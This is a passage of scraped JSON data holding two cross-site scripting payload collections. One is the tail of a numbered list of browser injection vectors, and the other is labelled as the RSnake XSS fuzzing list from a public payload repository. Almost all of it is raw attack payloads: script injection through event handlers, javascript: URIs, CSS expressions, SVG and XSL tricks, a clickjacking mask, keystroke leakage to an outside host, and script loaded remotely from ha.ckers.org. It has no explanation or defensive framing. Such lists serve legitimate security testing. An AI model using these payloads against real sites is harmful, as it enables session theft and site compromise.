color\\3Ared\\3B'\">X</div></div>\n<script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>//[\"'`-->]]>]</div>\n\n<div id=\"99\">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx:x //**/\\red/*)} /* IE 6-7 Standards mode */\n\n</style>//[\"'`-->]]>]</div>\n<div id=\"100\"><img[a][b]src=x[d]onerror[c]=[e]\"alert(100)\">//[\"'`-->]]>]</div><div id=\"101\"><a href=\"[a]java[b]script[c]:alert(101)\">XXX</a>//[\"'`-->]]>]</div><div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div><div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div>\n<div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar\"/>\n</svg>//[\"'`-->]]>]</div>\n<div id=\"105\"><iframe src=\"data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03\"></iframe>//[\"'`-->]]>]</div><div id=\"106\"><img src onerror /\" '\"= alt=alert(106)//\">//[\"'`-->]]>]</div><div id=\"107\"><title onpropertychange=alert(107)></title><title title=></title>//[\"'`-->]]>]</div>\n<div id=\"108\"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=xx:x onerror=alert(108)></a>\">\n\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt=\"`><img src=xx:x onerror=alert(2)//\">\n<?a foo=x=`y><img alt=\"`><img src=xx:x onerror=alert(3)//\">//[\"'`-->]]>]</div>\n\n<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>\n<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M0,0\" style=\"marker-start:url(test4.svg#a)\"/>\n</svg>//[\"'`-->]]>]</div>\n<div id=\"111\"><div style=\"background:url(/f#[a]oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"112\"><div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>\n<div id=\"113\"><div id=\"x\">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//[\"'`-->]]>]</div>\n<div id=\"114\"><x style=\"background:url('x[a];color:red;/*')\">XXX</x>//[\"'`-->]]>]</div>\n<div id=\"115\"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//[\"'`-->]]>]</div>\n\n<div id=\"116\"><div id=\"x\">x</div>\n<xml:namespace prefix=\"t\">\n<import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&lt;img&#11;src=x:x&#11;onerror&#11;=alert(116)&gt;\">//[\"'`-->]]>]</div>\n\n<div id=\"117\"><a href=\"http://attacker.org\">\n    <iframe src=\"http://example.org/\"></iframe>\n</a>//[\"'`-->]]>]</div>\n\n<div id=\"118\"><div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','malicious code');\">\n    <h1>Drop me</h1>\n</div>\n\n<iframe src=\"http://www.example.org/dropHere.html\"></iframe>//[\"'`-->]]>]</div>\n\n<div id=\"119\"><iframe src=\"view-source:http://www.example.org/\" frameborder=\"0\" style=\"width:400px;height:180px\"></iframe>\n\n<textarea type=\"text\" cols=\"50\" rows=\"10\"></textarea>//[\"'`-->]]>]</div>\n\n<div id=\"120\"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n</script>\n\n<body>\n<a href=\"#\" onclick=\"makePopups()\">Spam</a>//[\"'`-->]]>]</div>\n\n<div id=\"121\"><html xmlns=\"http://www.w3.org/1999/xhtml\"\nxmlns:svg=\"http://www.w3.org/2000/svg\">\n<body style=\"background:gray\">\n<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"/>\n<svg:svg>\n<svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\">\n    <svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/>\n    <svg:circle cx=\"0.45\" cy=\"0.7\" r=\"0.075\" fill=\"white\"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//[\"'`-->]]>]</div>\n<div id=\"122\"><iframe sandbox=\"allow-same-origin allow-forms allow-scripts\" src=\"http://example.org/\"></iframe>//[\"'`-->]]>]</div>\n<div id=\"123\"><span class=foo>Some text</span>\n<a class=bar href=\"http://www.example.org\">www.example.org</a>\n\n<script src=\"http://code.jquery.com/jquery-1.4.4.js\"></script>\n<script>\n$(\"span.foo\").click(function() {\nalert('foo');\n$(\"a.bar\").click();\n});\n$(\"a.bar\").click(function() {\nalert('bar');\nlocation=\"http://html5sec.org\";\n});\n</script>//[\"'`-->]]>]</div>\n\n<div id=\"124\"><script src=\"/\\example.com\\foo.js\"></script> // Safari 5.0, Chrome 9, 10\n<script src=\"\\\\example.com\\foo.js\"></script> // Safari 5.0//[\"'`-->]]>]</div>\n\n<div id=\"125\"><?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/xml\" href=\"#stylesheet\"?>\n<!DOCTYPE doc [\n<!ATTLIST xsl:stylesheet\n  id    ID    #REQUIRED>]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n    <xsl:stylesheet id=\"stylesheet\" version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n        <xsl:template match=\"/\">\n            <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(125)\"></iframe>\n        </xsl:template>\n    </xsl:stylesheet>\n    <circle fill=\"red\" r=\"40\"></circle>\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"126\"><object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object>\n<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"alert(126)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>//[\"'`-->]]>]</div>\n\n<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n<listener event=\"load\" handler=\"#y\" xmlns=\"http://www.w3.org/2001/xml-events\" observer=\"x\"/>\n<handler id=\"y\">alert(127)</handler>\n</svg>//[\"'`-->]]>]</div>\n<div id=\"128\"><svg><style>&lt;img/src=x onerror=alert(128)// </b>//[\"'`-->]]>]</div>\n<div id=\"129\"><svg>\n<image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>\")'>\n<!--\nSame effect with\n<image filter='...'>\n-->\n</svg>//[\"'`-->]]>]</div>\n\n<div id=\"130\"><math href=\"javascript:alert(130)\">CLICKME</math>\n\n<math>\n<!-- up to FF 13 -->\n<maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(2)\">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype=\"statusline\" xlink:href=\"javascript:alert(3)\">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//[\"'`-->]]>]</div>\n\n<div id=\"131\"><b>drag and drop one of the following strings to the drop box:</b>\n<br/><hr/>\njAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br/><hr/>\nfeed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br/><hr/>\nfeed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>\n<br/><hr/>\nfeed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//\n<br/><hr/>\n<div id=\"dropbox\" style=\"height: 360px;width: 500px;border: 5px solid #000;position: relative;\" ondragover=\"event.preventDefault()\">+ Drop Box +</div>//[\"'`-->]]>]</div>\n\n<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>\n<div id=\"133\"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[\"'`-->]]>]</div>\n<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>\n\n<div id=\"135\"><?xml-stylesheet type=\"text/xsl\" href=\"#\" ?>\n<stylesheet xmlns=\"http://www.w3.org/TR/WD-xsl\">\n<template match=\"/\">\n<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>\n<if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"></if>\n</template>\n</stylesheet>//[\"'`-->]]>]</div>\n\n<div id=\"136\"><form action=\"\" method=\"post\">\n<input name=\"username\" value=\"admin\" />\n<input name=\"password\" type=\"password\" value=\"secret\" />\n<input name=\"injected\" value=\"injected\" dirname=\"password\" />\n<input type=\"submit\">\n</form>//[\"'`-->]]>]</div>\n\n<div id=\"137\"><svg>\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"?\">\n<circle r=\"400\"></circle>\n<animate attributeName=\"xlink:href\" begin=\"0\" from=\"javascript:alert(137)\" to=\"&\" />\n</a>//[\"'`-->]]>]</div>\n<div id=\"138\"><link rel=\"import\" href=\"test.svg\" />//[\"'`-->]]>]</div><div id=\"139\"><iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />//[\"'`-->]]>]</div>undefined\n", "timestamp": "2025-10-21T13:30:28.072997"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/Intruders/RSNAKE_XSS.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/RSNAKE_XSS.txt", "content": "<SCRIPT>alert('XSS');</SCRIPT>\n'';!--\"<XSS>=&{()}\n<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>\n<IMG SRC=\"javascript:alert('XSS');\">\n<IMG SRC=javascript:alert('XSS')>\n<IMG SRC=JaVaScRiPt:alert('XSS')>\n<IMG SRC=javascript:alert(&quot;XSS&quot;)>\n<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\nSRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\n<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\n<IMG SRC=\"jav\tascript:alert('XSS');\">\n<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\n<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\n<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n<IMG SRC=\" &#14;  javascript:alert('XSS');\">\n<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>\n<IMG SRC=\"javascript:alert('XSS')\"\n<SCRIPT>a=/XSS/\n\\\";alert('XSS');//\n<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\n<BODY BACKGROUND=\"javascript:alert('XSS')\">\n<BODY ONLOAD=alert('XSS')>\n<IMG DYNSRC=\"javascript:alert('XSS')\">\n<IMG LOWSRC=\"javascript:alert('XSS')\">\n<BGSOUND SRC=\"javascript:alert('XSS');\">\n<BR SIZE=\"&{alert('XSS')}\">\n<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>\n<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">\n<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">\n<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\n<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">\n<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n<IMG SRC='vbscript:msgbox(\"XSS\")'>\n<IMG SRC=\"mocha:[code]\">\n<IMG SRC=\"livescript:[code]\">\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\n<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('XSS')>; REL=stylesheet\">\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">\n<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>\n<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>\n<TABLE BACKGROUND=\"javascript:alert('XSS')\">\n<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\n<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">\n<DIV STYLE=\"width: expression(alert('XSS'));\">\n<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>\n<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">\n<XSS STYLE=\"xss:expression(alert('XSS'))\">\nexp/*<XSS STYLE='no\\xss:noxss(\"*//*\");\n<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>\n<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>\n<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n<BASE HREF=\"javascript:alert('XSS');//\">\n<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>\n<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>\ngetURL(\"javascript:alert('XSS')\")\na=\"get\";\n<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('XSS');\">\n<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML>\n<HTML><BODY>\n<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>\n<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->\n<? echo('<SCR)';\n<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">\n<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\n", "timestamp": "2025-10-21T13:30:28.175836"}
